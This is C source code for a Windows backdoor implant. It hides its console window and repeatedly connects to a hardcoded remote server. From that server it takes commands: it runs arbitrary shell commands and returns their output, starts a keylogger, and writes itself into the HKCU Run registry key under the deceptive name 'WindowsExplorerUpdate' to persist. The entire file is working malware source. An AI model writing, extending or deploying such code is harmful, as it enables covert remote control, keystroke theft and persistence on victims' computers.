
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <winerror.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;


// Function to create persistence by adding a registry key for the program
int bootRun() {
    char err[128] = "Failed\n";
    char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;

    // Get the path of the current executable
    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (pathLen == 0) {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    HKEY NewVal;

    // Open the registry key for adding startup programs
    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    // Convert the path to a suitable format and set it as a registry value
    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    if (RegSetValueEx(NewVal, TEXT("WindowsExplorerUpdate"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
        RegCloseKey(NewVal);
        send(sock, err, sizeof(err), 0);
        return -1;
    }
    RegCloseKey(NewVal);
    send(sock, suc, sizeof(suc), 0);
    return 0;
}

// Function to extract a substring from a string
char *
str_cut(char str[], int slice_from, int slice_to)
{
        if (str[0] == '\0')
                return NULL;

        char *buffer;
        size_t str_len, buffer_len;

        if (slice_to < 0 && slice_from > slice_to) {
                str_len = strlen(str);
                if (abs(slice_to) > str_len - 1)
                        return NULL;

                if (abs(slice_from) > str_len)
                        slice_from = (-1) * str_len;

                buffer_len = slice_to - slice_from;
                str += (str_len + slice_from);

        } else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str);

                if (slice_from > str_len - 1)
                        return NULL;
                buffer_len = slice_to - slice_from;
                str += slice_from;

        } else
                return NULL;

        buffer = calloc(buffer_len, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;
}

// Main loop that receives and processes commands from the remote server
void Shell() {
	char buffer[1024];
	char container[1024];
	char total_response[18384];


	while (1) {
		jump:
		bzero(buffer,1024);
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, 1024, 0);

		// Quit the session
		if (strncmp("q", buffer, 1) == 0) {
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		// Change directory
		else if (strncmp("cd ", buffer, 3) == 0) {
			chdir(str_cut(buffer,3,100));
		}
		// Create persistence
		else if (strncmp("persist", buffer, 7) == 0) {
			bootRun();
		}
		// Start the keylogger
		else if (strncmp("keylog_start", buffer, 12) == 0) {
			HANDLE thread = CreateThread(NULL, 0,logg, NULL, 0, NULL);
			goto jump;
		}
		// Read the command output and send it back to the server
		else {
			FILE *fp;
			fp = _popen(buffer, "r");
			while(fgets(container,1024,fp) != NULL) {
				strcat(total_response, container);
			}
			send(sock, total_response, sizeof(total_response), 0);
			fclose(fp);
		}

	}

}

// Main entry point of the program
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
	// Allocate a console window for debugging
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);

	// Hide the console window
	ShowWindow(stealth, 0);

	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData;

	// Server IP and port configuration
	ServIP = "192.168.1.240";
	ServPort = 8080;

	// Initialize Winsock
	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
		exit(1)
        
        ;
	}

	// Create a socket
	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServAddr, 0, sizeof(ServAddr));
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);

	// Attempt to connect to the server
	start:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(10);
		goto start;
	}
	Shell();
}